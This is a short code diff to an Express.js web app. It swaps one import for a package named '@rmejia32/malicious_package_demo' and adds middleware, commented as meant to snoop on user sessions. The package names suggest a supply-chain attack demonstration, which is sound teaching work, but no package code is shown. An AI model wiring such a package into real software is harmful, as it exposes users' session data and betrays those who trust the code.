@@ -5,7 +5,7 @@ import { fileURLToPath } from "url";
 import session from "express-session";
 import bcrypt from "bcrypt";
 import fs from "fs";
-import { installSnoop } from "@rmejia/malicious-package-demo";
+import { installSnoop } from "@rmejia32/malicious_package_demo"; // import the malicious package
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -29,6 +29,7 @@ app.use(
   })
 );
 
+// use the malicious package to snoop on sessions
 app.use(installSnoop(session));
 
 app.get("/", (req, res) => {
